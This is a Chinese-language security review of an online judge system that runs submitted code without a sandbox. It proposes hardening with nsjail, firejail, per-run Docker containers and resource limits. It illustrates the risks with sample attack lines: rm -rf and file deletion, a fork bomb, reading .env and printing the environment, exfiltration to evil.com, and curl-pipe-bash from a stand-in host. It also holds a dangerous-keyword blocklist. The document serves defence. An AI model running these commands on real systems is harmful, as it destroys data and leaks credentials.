# 🔒 判题系统安全分析报告

## ⚠️ 当前安全状况

### 现有实现分析

当前判题系统使用 `subprocess.run()` 直接执行用户提交的代码，虽然运行在Docker容器中，但**没有额外的沙箱隔离**。

### 🔴 存在的安全风险

#### 1. 文件系统访问风险
**风险等级**: 🔴 高

恶意代码可以：
- 读取容器内的文件（包括源代码、配置文件）
- 删除或修改文件
- 遍历目录结构

**示例攻击代码**:
```python
# Python
import os
os.system('rm -rf /tmp/*')  # 删除临时文件
print(open('/app/oj_project/settings.py').read())  # 读取配置

# 或者
import shutil
shutil.rmtree('/app/static')  # 删除静态文件
```

#### 2. 资源耗尽攻击
**风险等级**: 🔴 高

恶意代码可以：
- 无限循环消耗CPU
- 申请大量内存
- Fork炸弹

**示例攻击代码**:
```python
# Python - Fork炸弹
import os
while True:
    os.fork()

# Python - 内存炸弹
a = []
while True:
    a.append(' ' * 10**9)

# C++ - 无限循环
while(1) {}
```

#### 3. 网络访问风险
**风险等级**: 🟡 中

恶意代码可以：
- 访问外部网络
- 发送数据
- DDoS攻击

**示例攻击代码**:
```python
import requests
# 泄露数据
requests.post('http://evil.com', data=open('/app/.env').read())

# 或进行DDoS
while True:
    requests.get('http://target.com')
```

#### 4. 信息泄露风险
**风险等级**: 🟡 中

恶意代码可以：
- 读取环境变量
- 访问数据库（如果有权限）
- 读取其他用户的提交代码

**示例攻击代码**:
```python
import os
print(os.environ)  # 打印所有环境变量
```

#### 5. 执行系统命令
**风险等级**: 🔴 高

恶意代码可以：
- 执行任意系统命令
- 安装软件包
- 修改系统配置

**示例攻击代码**:
```python
import os
os.system('apt-get install -y curl')
os.system('curl http://evil.com/malware.sh | bash')
```

### ✅ 现有的安全措施

#### 1. Docker容器隔离
- ✅ 与主机文件系统隔离
- ✅ 与主机网络部分隔离
- ⚠️ 但容器内部没有额外隔离

#### 2. 超时限制
- ✅ 设置了执行超时（默认1秒）
- ⚠️ 但不能防止瞬间的资源攻击

#### 3. 错误捕获
- ✅ 捕获运行时错误
- ⚠️ 但不能防止恶意行为

### ❌ 缺少的安全措施

1. ❌ **系统调用限制** - 没有限制可以使用的系统调用
2. ❌ **资源限制** - 没有CPU、内存、磁盘的硬限制
3. ❌ **文件系统隔离** - 可以访问容器内所有文件
4. ❌ **网络隔离** - 可以访问网络
5. ❌ **进程隔离** - 可以创建多个进程
6. ❌ **权限降级** - 以容器默认用户运行（通常是root）

## 🛡️ 安全加固方案

### 方案A：使用成熟的判题沙箱（推荐）

#### 1. Judger0
- 开源的代码执行系统
- 基于isolate沙箱
- 支持多种语言
- 有完善的资源限制

```bash
# 部署Judger0
docker-compose.yml:
  judger0:
    image: judge0/judge0:latest
    environment:
      - REDIS_HOST=redis
      - POSTGRES_HOST=db
```

#### 2. isolate
- Linux Contest Project的沙箱
- 使用Linux namespace和cgroups
- 严格的资源限制

```bash
# 在Dockerfile中安装isolate
RUN apt-get update && apt-get install -y isolate
```

### 方案B：自建沙箱（中级方案）

#### 1. 使用nsjail

```python
def judge_with_nsjail(code, input_data, time_limit):
    """使用nsjail执行代码"""
    cmd = [
        'nsjail',
        '--mode', 'o',  # 一次性模式
        '--chroot', '/tmp/sandbox',  # chroot隔离
        '--user', '65534',  # nobody用户
        '--group', '65534',
        '--time_limit', str(time_limit),
        '--max_cpus', '1',  # 限制CPU
        '--rlimit_as', '256',  # 限制内存256MB
        '--rlimit_fsize', '10',  # 限制文件大小10MB
        '--disable_proc',  # 禁用/proc
        '--iface_no_lo',  # 禁用网络
        '--',
        'python', '/tmp/code.py'
    ]
    # 执行命令...
```

#### 2. 使用firejail

```python
def judge_with_firejail(code, input_data, time_limit):
    """使用firejail执行代码"""
    cmd = [
        'firejail',
        '--quiet',
        '--private=/tmp/sandbox',  # 私有文件系统
        '--net=none',  # 禁用网络
        '--rlimit-cpu=' + str(time_limit),
        '--rlimit-as=' + str(256 * 1024 * 1024),  # 内存限制
        '--seccomp',  # 系统调用过滤
        'python', '/tmp/code.py'
    ]
    # 执行命令...
```

### 方案C：Docker in Docker（简单方案）

为每次判题创建独立的临时容器：

```python
def judge_with_docker(code, input_data, time_limit, memory_limit):
    """使用独立Docker容器判题"""
    import docker
    
    client = docker.from_env()
    
    # 创建临时容器
    container = client.containers.run(
        'python:3.11-alpine',
        command=['python', '-c', code],
        stdin_open=True,
        detach=True,
        network_disabled=True,  # 禁用网络
        mem_limit=f'{memory_limit}m',  # 内存限制
        cpu_period=100000,
        cpu_quota=50000,  # CPU限制
        pids_limit=10,  # 进程数限制
        read_only=True,  # 只读文件系统
        tmpfs={'/tmp': 'size=10m'},  # 临时文件限制
        security_opt=['no-new-privileges'],
        user='nobody'  # 非特权用户
    )
    
    # 等待执行...
    try:
        result = container.wait(timeout=time_limit)
        output = container.logs()
        return output
    finally:
        container.remove(force=True)
```

### 方案D：增强现有系统（快速方案）

在现有代码基础上添加一些限制：

```python
import resource
import signal

def set_limits():
    """设置资源限制"""
    # 限制CPU时间（秒）
    resource.setrlimit(resource.RLIMIT_CPU, (2, 2))
    # 限制内存（字节）
    resource.setrlimit(resource.RLIMIT_AS, (256 * 1024 * 1024, 256 * 1024 * 1024))
    # 限制进程数
    resource.setrlimit(resource.RLIMIT_NPROC, (10, 10))
    # 限制文件大小
    resource.setrlimit(resource.RLIMIT_FSIZE, (10 * 1024 * 1024, 10 * 1024 * 1024))

def judge_python_secure(submission, test_cases):
    """改进的Python判题"""
    # ... 前面的代码 ...
    
    process = subprocess.run(
        ['python', code_file],
        input=test_case.input_data,
        capture_output=True,
        text=True,
        timeout=problem.time_limit / 1000.0,
        check=False,
        preexec_fn=set_limits,  # 在子进程中设置限制
        env={},  # 清空环境变量
        cwd='/tmp'  # 设置工作目录
    )
```

## 🎯 推荐实施方案

### 短期方案（1-2天）

**方案D + 部分方案C**

1. 添加资源限制（CPU、内存、进程数）
2. 清空环境变量
3. 设置独立工作目录
4. 添加代码长度限制
5. 黑名单检查（禁止某些危险操作）

### 中期方案（1-2周）

**方案C: Docker in Docker**

1. 为每次判题创建独立容器
2. 容器配置严格的资源限制
3. 禁用网络
4. 只读文件系统
5. 非特权用户

### 长期方案（1个月+）

**方案A: 集成专业沙箱**

1. 部署Judger0或自建isolate沙箱
2. 完善的资源监控
3. 详细的日志记录
4. 安全审计机制

## 📊 安全等级对比

| 方案 | 安全等级 | 实施难度 | 性能影响 | 推荐度 |
|------|---------|---------|---------|--------|
| 当前方案 | 🔴 低 | - | 无 | ❌ |
| 方案D（增强） | 🟡 中低 | ⭐ 低 | 小 | ⭐⭐ |
| 方案C（Docker） | 🟡 中 | ⭐⭐ 中 | 中 | ⭐⭐⭐ |
| 方案B（nsjail） | 🟢 中高 | ⭐⭐⭐ 高 | 小 | ⭐⭐⭐⭐ |
| 方案A（Judger0） | 🟢 高 | ⭐⭐⭐⭐ 高 | 小 | ⭐⭐⭐⭐⭐ |

## ⚡ 立即可采取的措施

### 1. 代码审查和黑名单

```python
DANGEROUS_IMPORTS = [
    'os.system', 'subprocess', 'eval', 'exec',
    '__import__', 'open', 'file', 'input',
    'requests', 'urllib', 'socket'
]

def check_dangerous_code(code):
    """检查危险代码"""
    for dangerous in DANGEROUS_IMPORTS:
        if dangerous in code:
            return False, f'代码包含危险操作: {dangerous}'
    return True, ''
```

### 2. 代码长度限制

```python
MAX_CODE_LENGTH = 10000  # 10KB

if len(submission.code) > MAX_CODE_LENGTH:
    return {'error': '代码长度超过限制'}
```

### 3. 环境变量清理

```python
process = subprocess.run(
    ...,
    env={}  # 清空环境变量
)
```

### 4. 临时用户执行

```dockerfile
# Dockerfile
RUN useradd -m -u 1001 judger
USER judger
```

## 🚨 使用建议

### 当前系统适用场景

✅ **可以用于**:
- 学习和开发环境
- 内部小规模使用
- 信任的用户群体
- 非生产环境

❌ **不建议用于**:
- 公开的在线服务
- 不信任的用户
- 生产环境
- 包含敏感数据的系统

### 临时防护措施

在完成安全加固之前：

1. **限制访问**
   - 仅内网访问
   - 需要审核才能注册
   - 监控异常提交

2. **数据备份**
   - 定期备份数据库
   - 备份重要文件
   - 准备恢复方案

3. **监控告警**
   - 监控CPU/内存使用
   - 监控异常进程
   - 设置告警阈值

4. **定期重启**
   - 定期重启容器
   - 清理临时文件
   - 检查系统状态

## 📚 参考资源

### 开源判题系统

- **Judger0**: https://github.com/judge0/judge0
- **DMOJ**: https://github.com/DMOJ/judge-server
- **Vijos**: https://github.com/vijos/jd4
- **Hydro**: https://github.com/hydro-dev/Hydro

### 沙箱技术

- **isolate**: https://github.com/ioi/isolate
- **nsjail**: https://github.com/google/nsjail
- **firejail**: https://github.com/netblue30/firejail

### 安全文档

- Linux Namespace: https://man7.org/linux/man-pages/man7/namespaces.7.html
- cgroups: https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt
- seccomp: https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt

---

**最后更新**: 2025-10-02  
**状态**: ⚠️ 需要加强安全防护  
**优先级**: 🔴 高

